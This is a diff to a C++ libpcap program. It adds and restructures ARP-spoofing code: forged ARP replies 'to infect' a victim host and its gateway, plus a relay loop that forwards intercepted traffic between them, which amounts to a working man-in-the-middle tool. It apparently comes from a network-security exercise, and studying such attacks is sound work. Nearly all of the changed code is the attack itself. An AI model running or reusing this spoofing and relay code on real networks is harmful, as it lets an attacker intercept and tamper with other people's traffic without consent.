@@ -79,14 +79,13 @@ int main(int argc, char *argv[])
     }
 
 
-//    thread t(&receivePkt, handle, header);
-//    t.join();
+    //thread t(&receivePkt, handle, header);
+    //t.join();
 
-    a2s.printPkt();
     sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
-    a2t.printPkt();
     sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
-    cout << "Fin send\n";
+    thread t(&setInfectedPkt, handle, header);
+    t.join();
 
 }
 
@@ -115,17 +114,42 @@ void sendPkt(pcap_t *handle, u_char* send_pkt, int size)
 void setInfectedPkt(pcap_t *handle, struct pcap_pkthdr *header)
 {
     int res=0;
+    int checkSenderPkt=0;
+    int checkTargetPkt=0;
     const u_char *pkt;
     struct ether_header *eth;
     struct ether_arp *arp;
-    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0){
+    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0 && (checkSenderPkt < 1 || checkTargetPkt < 1 )){
         eth=(struct ether_header *)pkt;
         arp=(struct ether_arp *)(pkt+ETH_HLEN);
-    if(memcmp(arp->arp_spa, a2s.arp->arp_tpa, sizeof(in_addr)) ==0 )
-        memcpy(a2s.arp->arp_tha, arp->arp_spa, sizeof(in_addr));
-    else if(memcmp(arp->arp_spa, a2t.arp->arp_tpa, sizeof(in_addr)) ==0 )
-        memcpy(a2t.arp->arp_tha, arp->arp_spa, sizeof(in_addr));
+        if(memcmp(arp->arp_spa, a2s.arp->arp_tpa, sizeof(in_addr)) ==0 )
+        {
+            printf("a2s.eth->ether_dhost : "); for(int i=0; i<6;i++) printf("%02x ", a2s.eth->ether_dhost[i]);printf("\n");
+            printf("arp-> arp_sha : "); for(int i=0; i<6;i++) printf("%02x ", arp->arp_sha[i]);printf("\n");
+            printf("size : %d\n", ETH_ALEN);
+            memcpy(a2s.eth->ether_dhost, arp->arp_sha, ETH_ALEN);
+            memcpy(a2s.arp->arp_tha, arp->arp_sha, ETH_ALEN);
+            a2s.setArpOpcode(ARPOP_REPLY);
+            checkSenderPkt++;
+            sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
+            a2s.printPkt();
+            cout << "sned to infect sender" << endl;
+        }
+        else if(memcmp(arp->arp_spa, a2t.arp->arp_tpa, sizeof(in_addr)) ==0 )
+        {
+            printf("a2t.eth->ether_dhost : "); for(int i=0; i<6;i++) printf("%02x ", a2t.eth->ether_dhost[i]);printf("\n");
+            printf("arp-> arp_sha : "); for(int i=0; i<6;i++) printf("%02x ", arp->arp_sha[i]);printf("\n");
+            printf("size : %d\n", ETH_ALEN);
+            memcpy(a2t.eth->ether_dhost, arp->arp_sha, ETH_ALEN);
+            memcpy(a2t.arp->arp_tha, arp->arp_sha, ETH_ALEN);
+            a2t.setArpOpcode(ARPOP_REPLY);
+            checkTargetPkt++;
+            sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
+            a2t.printPkt();
+            cout << "sned to infect target" << endl;
+        }
     }
+    cout << "fin infect" << endl;
 }
 
 void receivePkt(pcap_t *handle, struct pcap_pkthdr *header)
@@ -140,46 +164,26 @@ void receivePkt(pcap_t *handle, struct pcap_pkthdr *header)
 
         cout << "checking" << endl;
         if(ntohs(eth->ether_type) == ETHERTYPE_ARP) {
-            if(memcmp(a2s.eth->ether_dhost, (u_char*)"\xFF\xFF\xFF\xFF\xFF\xFF", ETHER_ADDR_LEN) == 0) {
+            if(memcmp(a2s.eth->ether_dhost, (u_char*)"\xFF\xFF\xFF\xFF\xFF\xFF", ETH_ALEN) == 0) {
                 cout << "need to infect\n";
                 sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
                 sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
                 cout << "Send infect packet" << endl;
-            }            
-            else{
-                // check senderIP == received packet's sourceIP(=senderIP)
-                if(memcmp(a2s.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0){
-                    memcpy(eth->ether_dhost, a2t.arp->arp_tha, ETHER_ADDR_LEN);
-                    memcpy(eth->ether_shost, a2t.arp->arp_sha, ETHER_ADDR_LEN);
-                    cout << "victim's pkt relay to gatyway" << endl;
-                    // sender(victim)'s pkt relay to target(gateway)
-                } // check targetIP == received packet's sourceIP(=targetIP)
-                else if(memcmp(a2t.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0) {
-                    memcpy(eth->ether_dhost, a2s.arp->arp_tha, ETHER_ADDR_LEN);
-                    memcpy(eth->ether_shost, a2s.arp->arp_sha, ETHER_ADDR_LEN);
-                    cout << "gateway's pkt relay to victim" << endl;
-                    // sender(gateway)'s pkt relay to target(victim)
-                }
-                else continue;
+                continue;
             }
+        }
+        if(memcmp(a2s.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0){
+            memcpy(eth->ether_dhost, a2t.arp->arp_tha, ETH_ALEN);
+            memcpy(eth->ether_shost, a2t.arp->arp_sha, ETH_ALEN);
+            cout << "victim's pkt relay to gatyway" << endl;
+            // sender(victim)'s pkt relay to target(gateway)
+        } // check targetIP == received packet's sourceIP(=targetIP)
+        else if(memcmp(a2t.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0) {
+            memcpy(eth->ether_dhost, a2s.arp->arp_tha, ETH_ALEN);
+            memcpy(eth->ether_shost, a2s.arp->arp_sha, ETH_ALEN);
+            cout << "gateway's pkt relay to victim" << endl;
+            // sender(gateway)'s pkt relay to target(victim)
+        }
 
-        }
-        else{
-            cout << "size : " << header->len << endl;
-            // check senderIP == received packet's sourceIP(=senderIP)
-            if(memcmp(a2s.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0){
-                memcpy(eth->ether_dhost, a2t.arp->arp_tha, ETHER_ADDR_LEN);
-                memcpy(eth->ether_shost, a2t.arp->arp_sha, ETHER_ADDR_LEN);
-                cout << "victim's pkt relay to gatyway" << endl;
-                // sender(victim)'s pkt relay to target(gateway)
-            } // check targetIP == received packet's sourceIP(=targetIP)
-            else if(memcmp(a2t.arp->arp_tpa,arp->arp_spa, sizeof(in_addr)) == 0) {
-                memcpy(eth->ether_dhost, a2s.arp->arp_tha, ETHER_ADDR_LEN);
-                memcpy(eth->ether_shost, a2s.arp->arp_sha, ETHER_ADDR_LEN);
-                cout << "gateway's pkt relay to victim" << endl;
-                // sender(gateway)'s pkt relay to target(victim)
-            }
-            else continue;
-        }
     }
 }
